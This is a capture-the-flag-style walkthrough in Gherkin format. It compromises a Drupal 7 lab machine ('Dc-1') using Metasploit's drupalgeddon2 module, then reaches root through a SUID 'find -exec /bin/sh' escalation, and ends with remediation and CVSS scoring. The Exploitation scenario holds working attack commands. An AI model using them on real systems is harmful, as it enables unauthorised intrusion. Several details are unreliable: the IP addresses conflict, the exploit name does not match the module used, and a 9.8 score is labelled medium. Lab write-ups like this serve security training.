## Version 1.4.1
## language: en

Feature:
  TOE:
    Dc-1
  Category:
    Exec Code
  Location:
    182.168.0.27
  CWE:		
    CWE-20: Improper Input Validation
  Rule:
    REQ.077 Avoid disclosing technical information
  Goal:
    Gain root access
  Recommendation:
    Update the version of drupal

  Background:
  Hacker's software:
    | <Software name> | <Version>   |
    | Kali Linux      | 2020.1      |
    | Firefox Quantum | 68.20esr    |
    | Nmap            | 7.80        |
    | Mysql           | 15.1        |
  TOE information:
    Given I'm accessing the server 192.168.0.27
    And the machine have a web service in the port 8080

  Scenario: Normal use case
    Given I'm scanning the server
    """
    $ nmap -sV 182.168.0.27
    """
    When I see the open ports
    """
    PORT       STATE  SERVICE   VERSION 
    22/tcp     open   ssh       OpenSSH 6.0p1 Debian
    111/tcp    open   rpcbind   2-4 (RPC #100000)
    80/tcp     open   http      Apache httpd 2.2.22 ((Debian)
    """
    Then I decide go to service HTTP

  Scenario: Static detection
    Given the vulnerability is unrelated to the code
    Then I can't perform a static detection

  Scenario: Dynamic detection
    Given I have a web service
    When I use "nessus" to do a vulnerability scan
    Then I see that "nessus" does not give me interesting results
    And I decide to search for "Drupal" vulnerabilities
    When I find a vulnerability named "Drupalgeddon3"
    Then the vulnerability "Drupalgeddon3" exists in "metasploit"
    And it is this
    """
    https://www.exploit-db.com/exploits/44557
    """

  Scenario: Exploitation
    Given I found an exploit that's used with "Metasploit"
    When I start "Metasploit"
    Then I look for the exploit this way
    """
    msf5 > search drupal
    """
    And I choose this exploit
    """
    exploit/unix/webapp/drupal_drupalgeddon2
    """
    When we wrote "show options"
    Then I modify the "RHOSTS"
    """
    set RHOSTS 192.168.0.27
    """
    And all I have to do is launch the "exploit" command
    When we already have access to a meterpreter
    Then I start searching all the directories in "/var/www"
    And I found in the "script" directory the database credentials
    """
    'database' => 'drupaldb',
    'username' => 'dbuser',
    'password' => 'R0ck3t',
    'host' => 'localhost',
    'port' => '',
    'driver' => 'mysql',
    'prefix' => '',
    """
    When I start "Mysql" in my "Kali"
    Then I login to the "Drupal" user like this
    """
    $ mysql -h localhost -u dbuser -p
    """
    And unfortunately the database connection didn't work.
    When I decide to use the "shell" command in "meterpreter"
    Then I decide to search for files with "SUID" permissions
    """
    $ find / -perm -u=s -type f 2>/dev/null
    """
    And I see the "find" has "SUID" permissions
    When I do a search on the Internet
    And the "find" command can execute actions using the "-exec"
    When I decide to use the "-exec" in this way
    """
    $ find . -exec '/bin/sh' \;
    """
    And finally I put "whoami" to confirm that I'm "root"

  Scenario: Remediation
    Given I have the "Drupal 7.24"
    When I decide to search the Internet for a solution to remedy
    And I found that only upgrade to the most recent version

  Scenario: Scoring
  Severity scoring according to CVSSv3 standard
  Base: Attributes that are constants over time and organizations
    9.8/10 (medium) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  Temporal: Attributes that measure the exploit's popularity and fixability
    8.4/10 (medium) - E:F/RL:O/RC:U/CR:H/IR:H/AR:H
  Environmental: Unique and relevant attributes to a specific user environment
    8.4/10 (medium) - MAV:N/MAC:L/MPR:N/MUI:N/MS:U/MC:H/MI:H/MA:H

  Scenario: Correlations
    Given the version is no longer in use
    Then there is no correlation to date
